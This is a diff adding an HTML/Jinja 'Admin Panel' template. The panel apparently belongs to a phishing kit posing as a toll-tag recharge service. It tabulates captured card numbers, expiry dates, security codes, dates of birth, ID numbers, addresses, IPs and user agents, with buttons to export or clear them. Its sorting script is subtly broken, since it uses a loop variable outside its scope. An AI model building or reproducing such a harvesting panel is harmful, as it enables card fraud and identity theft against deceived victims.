@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Admin Panel</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+        html {
+            font-size: 16px;
+        }
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #121212;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+        h1 {
+            color: #00ff00;
+            text-shadow: 0 0 5px #00ff00;
+            text-align: center;
+            font-size: 28px;
+        }
+        .search-bar {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        #searchInput {
+            padding: 10px;
+            width: 80%;
+            max-width: 400px;
+            background-color: #333;
+            border: 1px solid #00ff00;
+            color: #e0e0e0;
+            border-radius: 4px;
+        }
+        #searchInput:focus {
+            box-shadow: 0 0 10px #00ff00;
+        }
+        .table-container {
+            overflow-x: auto;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background-color: #1e1e1e;
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3);
+        }
+        th, td {
+            border: 1px solid #00ff00;
+            padding: 12px;
+            text-align: left;
+        }
+        th {
+            background-color: #333;
+            cursor: pointer;
+        }
+        th:hover {
+            background-color: #00cc00;
+        }
+        tr:nth-child(even) {
+            background-color: #222;
+        }
+        tr:hover {
+            background-color: #444;
+            box-shadow: 0 0 5px #00ff00 inset;
+        }
+        .buttons {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        button, a button {
+            background-color: #00ff00;
+            color: #121212;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            min-width: 150px;
+        }
+        button:hover, a button:hover {
+            background-color: #00cc00;
+            box-shadow: 0 0 10px #00ff00;
+        }
+        .flash {
+            color: #66ff66;
+            text-align: center;
+        }
+        @media (max-width: 600px) {
+            body {
+                padding: 10px;
+            }
+            h1 {
+                font-size: 22px;
+            }
+            #searchInput {
+                width: 100%;
+            }
+            th, td {
+                padding: 8px;
+                font-size: 14px;
+            }
+            .buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+            button, a button {
+                width: 100%;
+                margin: 5px 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome {{ username }}</h1>
+    {% with messages = get_flashed_messages() %}
+        {% if messages %}
+            {% for message in messages %}
+                <p class="flash">{{ message }}</p>
+            {% endfor %}
+        {% endif %}
+    {% endwith %}
+    <div class="search-bar">
+        <input type="text" id="searchInput" placeholder="Search submissions...">
+    </div>
+    <div class="table-container">
+        <table id="submissionsTable">
+            <thead>
+                <tr>
+                    <th onclick="sortTable(0)">Timestamp</th>
+                    <th onclick="sortTable(1)">Tag Number</th>
+                    <th onclick="sortTable(2)">Amount to be recharged</th>
+                    <th onclick="sortTable(3)">Select</th>
+                    <th onclick="sortTable(4)">Cardholder's Name</th>
+                    <th onclick="sortTable(5)">Card Number</th>
+                    <th onclick="sortTable(6)">Expiration Date</th>
+                    <th onclick="sortTable(7)">Security Code</th>
+                    <th onclick="sortTable(8)">Email</th>
+                    <th onclick="sortTable(9)">Phone Number</th>
+                    <th onclick="sortTable(10)">Date of birth</th>
+                    <th onclick="sortTable(11)">ID Number</th>
+                    <th onclick="sortTable(12)">Billing Address</th>
+                    <th onclick="sortTable(13)">City</th>
+                    <th onclick="sortTable(14)">Province</th>
+                    <th onclick="sortTable(15)">Zip Code</th>
+                    <th onclick="sortTable(16)">User Agent</th>
+                    <th onclick="sortTable(17)">IP</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for sub in submissions %}
+                <tr>
+                    <td>{{ sub.timestamp }}</td>
+                    <td>{{ sub.tag_number }}</td>
+                    <td>{{ sub.amount_to_recharge }}</td>
+                    <td>{{ sub.select }}</td>
+                    <td>{{ sub.cardholder_name }}</td>
+                    <td>{{ sub.card_number }}</td>
+                    <td>{{ sub.expiration_date }}</td>
+                    <td>{{ sub.security_code }}</td>
+                    <td>{{ sub.email }}</td>
+                    <td>{{ sub.phone_number }}</td>
+                    <td>{{ sub.date_of_birth }}</td>
+                    <td>{{ sub.id_number }}</td>
+                    <td>{{ sub.billing_address }}</td>
+                    <td>{{ sub.city }}</td>
+                    <td>{{ sub.province }}</td>
+                    <td>{{ sub.zip_code }}</td>
+                    <td>{{ sub.user_agent }}</td>
+                    <td>{{ sub.ip }}</td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+    </div>
+    <div class="buttons">
+        <a href="/admin/download"><button>Download CSV</button></a>
+        <form action="/admin/clear" method="POST" style="display:inline;">
+            <button type="submit" onclick="return confirm('Clear all submissions?');">Clear Data</button>
+        </form>
+        <a href="/admin/logout"><button>Logout</button></a>
+    </div>
+
+    <script>
+        // Table sorting function
+        function sortTable(n) {
+            const table = document.getElementById("submissionsTable");
+            let switching = true, dir = "asc", switchcount = 0;
+            while (switching) {
+                switching = false;
+                const rows = table.rows;
+                for (let i = 1; i < (rows.length - 1); i++) {
+                    let shouldSwitch = false;
+                    const x = rows[i].getElementsByTagName("TD")[n];
+                    const y = rows[i + 1].getElementsByTagName("TD")[n];
+                    if (dir == "asc") {
+                        if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
+                            shouldSwitch = true;
+                            break;
+                        }
+                    } else if (dir == "desc") {
+                        if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
+                            shouldSwitch = true;
+                            break;
+                        }
+                    }
+                }
+                if (shouldSwitch) {
+                    rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
+                    switching = true;
+                    switchcount++;
+                } else {
+                    if (switchcount == 0 && dir == "asc") {
+                        dir = "desc";
+                        switching = true;
+                    }
+                }
+            }
+        }
+
+        // Table search function
+        document.getElementById('searchInput').addEventListener('keyup', function() {
+            const filter = this.value.toLowerCase();
+            const rows = document.querySelectorAll('#submissionsTable tbody tr');
+            rows.forEach(row => {
+                const text = row.textContent.toLowerCase();
+                row.style.display = text.includes(filter) ? '' : 'none';
+            });
+        });
+    </script>
+</body>
+</html>
